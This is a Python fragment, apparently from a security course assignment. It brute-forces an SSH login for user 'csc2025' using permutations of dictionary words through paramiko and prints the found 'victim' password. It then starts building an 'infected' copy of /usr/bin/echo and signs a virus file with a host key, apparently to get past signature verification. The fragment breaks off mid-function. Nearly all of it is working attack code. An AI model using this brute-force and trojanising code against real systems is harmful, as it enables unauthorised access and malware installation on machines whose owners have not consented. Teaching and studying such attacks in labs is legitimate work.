def dictionary_attack(dict_file):
    words = []
    with open(dict_file,"r") as f:
        words = [line.strip() for line in f if line.strip()]
    passwords = []
    for i in range(1, len(words)+1):
        for permutation in itertools.permutations(words,i):
            password = ''.join(permutation)
            passwords.append(password)

    for password in passwords:
        ssh_client = build_ssh_connection(username='csc2025',password=password)
        if ssh_client:
            print(f'Victim\'s SSH username is csc2025, password is {password}')
            return ssh_client
    return None

def build_ssh_connection(username,password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=CLIENT_IP,port=22,username=username,password=password,timeout=15)
        return client
    except paramiko.AuthenticationException:
        print(f'{password} is not the correct password!')
        client.close()
        return None
    except Exception as e:
        print(e)
        client.close()
        return None
    
def build_infected_echo(ssh_client: paramiko.SSHClient):
    subprocess.run("cp /usr/bin/echo /app/echo", shell=True) # text is to store output as string (bytes by default)
    echo_size_str = subprocess.run("ls -l /app/echo | awk \'{{print $5}}\'", shell=True, capture_output=True, text=True)
    echo_size = int(echo_size_str.stdout)
    subprocess.run("gzip -c /app/echo > /app/echo.gz",shell=True, capture_output=True)
    echo_zip_size_str = subprocess.run("ls -l /app/echo.gz | awk \'{{print $5}}\'", shell=True, capture_output=True, text=True)
    echo_zip_size = int(echo_zip_size_str.stdout)

    subprocess.run(["openssl", "dgst", "-provider", "oqsprovider", "-sign", "/app/certs/host.key", "-out", "virus.sig", "-binary", f"{VIRUS_FILE}"])
